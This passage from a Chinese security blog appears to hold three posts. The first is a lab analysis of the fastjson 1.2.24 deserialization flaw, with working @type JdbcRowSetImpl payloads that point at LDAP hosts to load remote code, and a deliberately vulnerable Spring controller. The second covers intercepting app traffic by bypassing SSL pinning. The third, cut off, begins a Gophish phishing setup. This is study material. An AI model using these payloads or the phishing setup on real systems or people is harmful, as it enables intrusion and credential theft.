class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：这里没有调用构造方法是因为前面调用过，构造方法只会调用一次（在整个对象的生命周期）</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301105058689.png" class="" title="image-20240301105058689"><p>使用fastjson的 <em>JSON</em>.<em>parseObject</em> 方法来反序列化json字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//反序列化json字符串</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString); <span class="hljs-comment">//反序列化时，会调用构造方法</span><br>        System.out.println(jsonObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：这里没有调用构造方法是因为前面调用过，构造方法只会调用一次（在整个对象的生命周期）</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301111219792.png" class="" title="image-20240301111219792"><p>添加@type字段进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//反序列化json字符串</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString); <span class="hljs-comment">//反序列化时，会调用构造方法</span><br>        System.out.println(jsonObject);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//**反序列化时带有@type参数，会执行类的构造方法和属性相关的get，set方法**，也造成了漏洞的产生</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;cc\&quot;&#125;&quot;</span>;<br>        JSON.parseObject(payload); <span class="hljs-comment">//有@type参数，set、get、构造方法都有调用！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301112134212.png" class="" title="image-20240301112134212"><p>更换payload，借助jdbcRowSetImpl类让目标访问远程ldap服务器，执行恶意类</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>@type<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>dataSourceName<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>ldap://localhost:1389/Exploit<span class="hljs-char escape_">\&quot;</span>,&quot;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot; <span class="hljs-char escape_">\&quot;</span>autoCommit<span class="hljs-char escape_">\&quot;</span>:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>用工具生成一个jndi服务，执行计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301112904972.png" class="" title="image-20240301112904972"><p>更换payload1中ldap的地址和路径，进行反序列化操作，成功弹出计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301113035437.png" class="" title="image-20240301113035437"><h4 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h4><p>payload是通过 jdbcRowSetImpl 类来实现的，查找 jdbcRowSetImpl 类的位置，直接ctrl+左键就可以调到这个类的位置</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301141234438.png" class="" title="image-20240301141234438"><p>跳过来后点这个按钮即可定位类的路径</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301141416747.png" class="" title="image-20240301141416747"><p><strong>由前面的演示得知，反序列化时带有@type参数，会执行指定类的构造方法和属性相关的get，set方法</strong></p><h6 id="查找-dataSourceName-的get和set方法："><a href="#查找-dataSourceName-的get和set方法：" class="headerlink" title="查找 dataSourceName 的get和set方法："></a>查找 dataSourceName 的get和set方法：</h6><p><em>getDataSourceName</em> 方法就是返回dataSource值</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305094647956.png" class="" title="image-20240305094647956"><p><em>setDataSourceName</em> 方法是传递一个字符串值var1，具体操作如下：</p><ol><li>通过 <code>this.getDataSourceName()</code> 方法获取当前数据源的名称，然后检查是否为 null。如果当前数据源名称不为 null，则进入下一步判断。</li><li>在当前数据源名称不为 null 的情况下，再次通过 <code>this.getDataSourceName()</code> 方法获取当前数据源名称，并与传入的参数 <code>var1</code> 进行比较。如果两者不相等，则执行以下操作。</li><li>调用父类的 <code>setDataSourceName</code> 方法，将参数 <code>var1</code> 设置为新的数据源名称。</li><li>将类中的 <code>conn</code>（连接对象）置为 null，表示需要重新建立连接。</li><li>将类中的 <code>ps</code>（预编译语句对象）置为 null，表示需要重新创建预编译语句对象。</li><li>将类中的 <code>rs</code>（结果集对象）置为 null，表示需要重新创建结果集对象。</li></ol><p>简单来说就是将参数var1赋值给dataSource，payload中就是将恶意地址<code>ldap://localhost:1389/Exploit</code>赋值给了dataSource</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305094733791.png" class="" title="image-20240305094733791"><h6 id="查找-autoCommit-的get和set方法："><a href="#查找-autoCommit-的get和set方法：" class="headerlink" title="查找 autoCommit 的get和set方法："></a>查找 autoCommit 的get和set方法：</h6><p><em>getAutoCommit</em> 方法就是返回一个布尔值</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305095559183.png" class="" title="image-20240305095559183"><p><em>setAutoCommit</em> 方法中 this.conn 是否为空，为空就调用 <em>connect</em> 方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305095627410.png" class="" title="image-20240305095627410"><h6 id="查看-connect-方法："><a href="#查看-connect-方法：" class="headerlink" title="查看 connect 方法："></a>查看 <em>connect</em> 方法：</h6><p><em>connect</em> 方法先判断this.conn 是否为空，然后一眼就看到了两行很熟悉的代码 (jndi注入.md) ，其中调用了lookup方法解析了dataSource的值。</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305100017425.png" class="" title="image-20240305100017425"><p>创建一个小demo测试一下，直接利用 JdbcRowSetImpl 类来触发其中的 lookup 方法：</p><p>new一个 <em>JdbcRowSetImpl</em> 对象，调用其 <em>setDataSourceName</em> 和 <em>setAutoCommit</em> 方法，解析ldap地址</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://172.16.123.1:1389/vsrlgw&quot;</span>);<br>        jdbcRowSet.setAutoCommit(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305101750773.png" class="" title="image-20240305101750773"><h4 id="web演示："><a href="#web演示：" class="headerlink" title="web演示："></a>web演示：</h4><p>之前log4j是通过servlet进行演示的，这里利用springboot进行演示</p><h6 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h6><p>创建一个springboot项目：</p><p>更换一下服务器，换成阿里的，更换类型为maven，，更换java环境为java8，然后改个名即可</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305102302726.png" class="" title="image-20240305102302726"><p>添加一下所需要的组件，这里只添加spring web即可</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305102415990.png" class="" title="image-20240305102415990"><p>项目中 application.properties 为springboot的配置文件，可以修改端口，配置数据库连接等操作，这里将端口改为了8081，为避免与burp冲突</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305103033925.png" class="" title="image-20240305103033925"><p>项目中 FastJsonWebApplication 为启动文件，一般都是WebApplication为后缀</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305103127482.png" class="" title="image-20240305103127482"><p>访问端口，如下代表搭建成功</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305110149242.png" class="" title="image-20240305110149242"><p>在pom.xml中添加fastjson 1.2.24的依赖，然后刷新maven</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305111704201.png" class="" title="image-20240305111704201"><h6 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h6><p>创建一个控制器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305110327754.png" class="" title="image-20240305110327754"><p>敲代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjsonweb.controller;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-comment">//使用@RestController注解将其标记为Spring Boot控制器</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">//使用@RequestMapping注解将该方法映射到请求的/fastjson路径</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjsonController</span> &#123;<br>    <span class="hljs-comment">//使用@GetMapping注解将该方法映射到GET请求的/hello路径</span><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello &quot;</span> + name;<br>    &#125;<br>    <br>    <span class="hljs-comment">//使用@PostMapping注解将该方法映射到POST请求的/vuln路径</span><br>    <span class="hljs-meta">@PostMapping(&quot;/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fastjson</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String code)</span>&#123;<br>        JSON.parseObject(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://localhost:8081/fastjson/hello</code> ，页面返回400，这是因为需要传递参数</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305140646671.png" class="" title="image-20240305140646671"><p>传递一个name参数，页面成功回显，证明没问题</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305142855013.png" class="" title="image-20240305142855013"><p>访问 <code>http://localhost:8081/fastjson/vuln</code>，页面返回405，方法错误，需要post访问</p><p>使用hackbar的post传参，参数为code，值为fastjson的payload，执行后成功弹出计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305143657101.png" class="" title="image-20240305143657101">]]></content>
    
    
    <categories>
      
      <category>漏洞浅析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastjson</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APP抓包</title>
    <link href="/2023/11/06/APP%E6%8A%93%E5%8C%85/"/>
    <url>/2023/11/06/APP%E6%8A%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>使用工具：夜神模拟器安卓5版本、xposed、Fiddle、BP</p><p>情况一：可以设置代理，但使用xposed时，安卓7不能正常访问百度，安卓5可以访问（怀疑app的数据也受到了影响）</p><p>工具作用：使用 Xposed + JustTruestMe 来突破SSL。一旦 app 校验了证书的指纹信息。我们的证书不再受信任了。自然而然就无法建立连接，所以必须想办法让 app 信任，才能继续抓包。</p><p>整体思路：模拟器安装xposed， JustTruestMe。设置代理转发到Fiddle，再转发到BP</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><p>1、直接安装夜神模拟器自带的xposed</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142509941.png" class="" title="image-20231106142509941"><p>2、安装</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142804537.png" class="" title="image-20231106142804537"><p>3、允许</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142931240.png" class="" title="image-20231106142931240"><p>4、等待重启（卡住的话手动重启）</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143018555.png" class="" title="image-20231106143018555"><p>5、安装完JustTruestMe后，找到xposed的模块，勾选上JustTruestMe</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143242298.png" class="" title="image-20231106143242298"><p>6、Fiddle配置。工具-&gt;选项-&gt;连接，如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143703331.png" class="" title="image-20231106143703331"><p>7、Fiddle配置。工具-&gt;选项-&gt;网关，如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143823470.png" class="" title="image-20231106143823470"><p>8、配置模拟器代理，ip为物理机IP</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106145732311.png" class="" title="image-20231106145732311"><p>9、安装Fiddle证书。访问软件所在的物理IP和软件端口，点击下载安装</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106145148292.png" class="" title="image-20231106145148292"><p>10、打开BP，就可以抓包了，修改一下BP的端口为8081</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106150719726.png" class="" title="image-20231106150719726"><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>情况二：1、有的apk不能在安卓5上运行，只能在安卓7以上运行。2、设置代理抓不到包（不能完全解决此问题，有的软件还是不能正常访问所有功能点）</p><p>使用工具： 夜神模拟器安卓7版本，Postern + Charles + Burpsuite</p><p>工具作用：App 为了防止中间人抓包，特意设置了不走代理这个选项。通过 VPN 将所有流量转发到 Charles 的 socks 代理，再打开 Charles 的 External Proxy Server — （外部代理服务器）转发到 Burpsuite</p><p>整体思路：模拟器安装Postern。开启VPN转到 Charles，再转发到BP</p><h2 id="操作流程-1"><a href="#操作流程-1" class="headerlink" title="操作流程"></a>操作流程</h2><p>1、激活Charles地址：<a href="https://www.zzzmode.com/mytools/charles/%E3%80%82%E5%9C%A8%E8%BF%99%E4%B8%AA%E4%BD%8D%E7%BD%AE%E6%BF%80%E6%B4%BB%EF%BC%8C%E6%AD%A4%E5%9B%BE%E4%B8%BA%E6%BF%80%E6%B4%BB%E5%AE%8C%E7%9A%84">https://www.zzzmode.com/mytools/charles/。在这个位置激活，此图为激活完的</a></p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106152549650.png" class="" title="image-20231106152549650"><p>2、Windows proxy没有勾选，因为我不抓PC的数据</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106152915049.png" class="" title="image-20231106152915049"><p>3、点击proxy setting，如此配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106153109788.png" class="" title="image-20231106153109788"><p>4、配置模拟器代理，ip为物理机IP，端口为8888。浏览器访问<a href="http://chls.pro/ssl%EF%BC%8C%E5%B0%B1%E4%BC%9A%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6%EF%BC%8C">http://chls.pro/ssl，就会下载证书，</a></p><p>问题：因为打开了external proxy settings,所以下载不到证书，会报错。关掉。</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106155151403.png" class="" title="image-20231106155151403"><p>5、下载完证书后关掉代理。postern中如下配置，名称随便，IP为物理机IP，端口和代理类型和Charles相同</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106155853897.png" class="" title="image-20231106155853897"><p>6、postern中如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160103635.png" class="" title="image-20231106160103635"><p>7、打开关闭VPN</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160148061.png" class="" title="image-20231106160148061"><p>8、Charles数据转到BP配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160328654.png" class="" title="image-20231106160328654"><p>注：安装一个软件后，请多尝试。eg:A软件首次打开后，后打开代理就无法抓包。在首次打开软件的前打开代理，软件就可以抓包，这是为啥？？？</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mp.weixin.qq.com/s/MKwYYjcHiiHNzT4RzRuBZg">微信公众平台 (qq.com)</a></p><p><a href="https://blog.csdn.net/holyxp/article/details/131768201">Postern + Charles + Burpsuite 进行对 APP 进行抓包_postern 抓包-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>APP抓包</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APP</tag>
      
      <tag>xposed</tag>
      
      <tag>Fiddle</tag>
      
      <tag>Postern</tag>
      
      <tag>Charles</tag>
      
      <tag>Burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gophish</title>
    <link href="/2023/07/13/Gophish/"/>
    <url>/2023/07/13/Gophish/</url>
    
    <content type="html"><![CDATA[<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>买了一个云服务器和两个域名</p><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>使用Gophish钓鱼平台，使用腾讯的邮件推送服务作为邮件服务器</p><h2 id="腾讯邮件服务器的操作流程"><a href="#腾讯邮件服务器的操作流程" class="headerlink" title="腾讯邮件服务器的操作流程"></a>腾讯邮件服务器的操作流程</h2><p>1、登录腾讯邮件推送服务，点击立即开始</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%811.png" class="" title="腾讯邮件推送"><p>2、点击新建</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%812.png" class="" title="腾讯邮件推送"><p>3、选择买的域名</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%813.png" class="" title="腾讯邮件推送"><p>4、点击验证</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%814.png" class="" title="腾讯邮件推送"><p>5、验证按照此链接完成就行</p><p>参考链接：<a href="https://cloud.tencent.com/document/product/1288/60652">邮件推送 身份验证和配置相关问题-常见问题-文档中心-腾讯云 (tencent.com)</a></p><p>6、点击发信地址配置。点击新建创建发信人和密码（随意创建）</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%818.png" class="" title="腾讯邮件推送"><h2 id="gophish操作流程"><a href="#gophish操作流程" class="headerlink" title="gophish操作流程"></a>gophish操作流程</h2><p>1、首先对sending profiles进行配置，发送人和用户名要一样，密码为上图中的SMTP密码</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A81.png" class="" title="gophish使用"><p>2、第二步对邮件内容进行配置</p> <img 